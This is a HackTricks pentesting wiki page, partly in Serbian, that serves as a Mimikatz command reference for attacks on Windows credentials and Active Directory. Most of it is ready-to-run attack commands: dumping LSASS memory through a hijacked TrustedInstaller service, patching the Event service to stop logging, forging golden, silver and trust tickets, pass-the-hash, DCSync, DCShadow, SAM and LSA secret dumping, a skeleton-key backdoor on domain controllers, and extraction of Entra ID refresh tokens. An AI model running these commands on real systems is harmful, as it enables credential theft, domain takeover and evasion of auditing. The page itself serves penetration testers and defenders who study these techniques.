# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Ova stranica je zasnovana na jednoj sa [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Pogledaj original za više informacija!

## LM and Clear-Text in memory

Od Windows 8.1 i Windows Server 2012 R2 nadalje, sprovedene su značajne mere za zaštitu od krađe credentiala:

- **LM hashes i plain-text passwords** se više ne čuvaju u memoriji radi povećanja bezbednosti. Određeno registry podešavanje, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ mora biti podešeno na DWORD vrednost `0` da bi se onemogućio Digest Authentication, čime se obezbeđuje da se "clear-text" passwords ne keširaju u LSASS.

- **LSA Protection** je uveden da zaštiti Local Security Authority (LSA) proces od neovlašćenog čitanja memorije i code injection. Ovo se postiže označavanjem LSASS-a kao protected process. Aktivacija LSA Protection uključuje:
1. Izmenu registry-ja na _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ podešavanjem `RunAsPPL` na `dword:00000001`.
2. Implementaciju Group Policy Object (GPO) koja primenjuje ovu registry promenu na svim upravljanim uređajima.

Uprkos ovim zaštitama, alati poput Mimikatz mogu zaobići LSA Protection koristeći specifične drivere, iako će takve aktivnosti verovatno biti zabeležene u event logs.

Na modernim workstationima ovo je još važnije zato što je **Credential Guard omogućen podrazumevano na mnogim Windows 11 22H2+ i Windows Server 2025 domain-joined, non-DC sistemima**, dok je **LSASS-as-PPL omogućen podrazumevano na svežim Windows 11 22H2+ instalacijama**. U praksi, to znači da `sekurlsa::logonpasswords` često daje manje materijala nego što je stariji tradecraft očekivao, pa operatori sve više prelaze na **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, ili **CloudAP/PRT-oriented modules**. Za stranu zaštite, pogledaj [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Administratori obično imaju SeDebugPrivilege, što omogućava debugovanje programa. Ovo privilegijum može biti ograničeno da bi se sprečilo neovlašćeno memory dumps, uobičajena tehnika koju napadači koriste za izdvajanje credentiala iz memorije. Međutim, čak i kada je ovaj privilegijum uklonjen, TrustedInstaller nalog i dalje može da izvrši memory dumps koristeći prilagođenu service configuration:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Ovo omogućava izbacivanje memorije `lsass.exe` u fajl, koji se zatim može analizirati na drugom sistemu radi izdvajanja kredencijala:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:

#### Clearing Event Logs

- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
- The `event::drop` command then patches the Event Logging service.

### Kerberos Ticket Attacks

Use the commands below as quick syntax reminders. The dedicated pages for [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), and [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contain the up-to-date AES/PAC/opsec nuances.

### Golden Ticket Creation

A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Ime domena.
- `/sid`: Security Identifier (SID) domena.
- `/user`: Korisničko ime za impersonate.
- `/krbtgt`: NTLM hash naloga domena za KDC service.
- `/ptt`: Direktno ubacuje ticket u memoriju.
- `/ticket`: Čuva ticket za kasniju upotrebu.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Kreiranje Silver Ticket

Silver Ticket omogućavaju pristup specifičnim servisima. Ključna komanda i parametri:

- Komanda: Slično kao Golden Ticket, ali cilja specifične servise.
- Parametri:
- `/service`: Servis koji se cilja (npr. cifs, http).
- Ostali parametri slični kao kod Golden Ticket.

Primer:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Kreiranje Trust Ticket-a

Trust Ticket-i se koriste za pristup resursima preko domena iskorišćavanjem trust relationships. Ključna komanda i parametri:

- Komanda: Slično kao Golden Ticket, ali za trust relationships.
- Parametri:
- `/target`: FQDN ciljnog domena.
- `/rc4`: NTLM hash za trust account.

Primer:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Dodatne Kerberos komande

- **Listing Tickets**:

- Komanda: `kerberos::list`
- Prikazuje sve Kerberos tickete za trenutnu korisničku sesiju.

- **Pass the Cache**:

- Komanda: `kerberos::ptc`
- Ubacuje Kerberos tickete iz cache fajlova.
- Primer: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Komanda: `kerberos::ptt`
- Omogućava korišćenje Kerberos ticketa u drugoj sesiji.
- Primer: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Komanda: `kerberos::purge`
- Briše sve Kerberos tickete iz sesije.
- Korisno pre korišćenja komandi za manipulaciju ticketima da bi se izbegli konflikti.

### Over-Pass-the-Hash / Pass-the-Key

Ako je `RC4` onemogućen ili nepouzdan, Mimikatz može da patchuje **AES128/AES256 Kerberos keys** u trenutnu logon sesiju umesto da koristi samo NT hash. Ovo je obično bolji izbor za moderne domene nego tretirati `sekurlsa::pth` kao NTLM-only.
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` ponovo koristi trenutni proces umesto da pokrene novu konzolu, što je korisno kada želiš odmah da pokreneš stvari kao što je `lsadump::dcsync` u istom kontekstu.

### Active Directory Tampering

- **DCShadow**: Privremeno natera mašinu da se ponaša kao DC za manipulaciju AD objekata. Pogledajte [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Oponaša DC da bi zatražio podatke o lozinkama. Pogledajte [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: Ekstrahuje kredencijale iz LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Oponaša DC koristeći podatke o lozinki naloga računara.

- _Nije naveden konkretan komad za NetSync u originalnom kontekstu._

- **LSADUMP::SAM**: Pristupa lokalnoj SAM bazi.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Dešifruje tajne sačuvane u registriju.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Postavlja novi NTLM hash za korisnika.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Pribavlja informacije o autentifikaciji poverenja.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

Na hostovima sa **Entra ID** ili **hybrid-joined**, `sekurlsa::cloudap` može izložiti keširane materijale **Primary Refresh Token (PRT)** iz LSASS-a. Ako je povezani Proof-of-Possession ključ zaštićen softverom, `dpapi::cloudapkd` može izvesti clear/derived key materijal potreban za naknadne **Pass-the-PRT** tokove rada.
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Ovo postaje mnogo teže kada je ključ TPM-backed, ali vredi proveriti na hybrid endpoint-ovima jer cached CloudAP podaci mogu biti zanimljiviji od klasičnog `wdigest` output-a. Za cloud-side abuse chain, vidi [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Miscellaneous

- **MISC::Skeleton**: Ubacuje backdoor u LSASS na DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Dobija backup prava.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Dobija debug privilegije.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Prikazuje credentials za prijavljene korisnike.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Ekstrahuje Kerberos tickets iz memorije.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: Menja SID i SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _Nema specifične komande za modify u originalnom kontekstu._

- **TOKEN::Elevate**: Impersonira tokene.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Dozvoljava više RDP sesija.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Prikazuje TS/RDP sesije.
- _Nema specifične komande za TS::Sessions u originalnom kontekstu._

### Vault

- Ekstrahuje passwords iz Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}
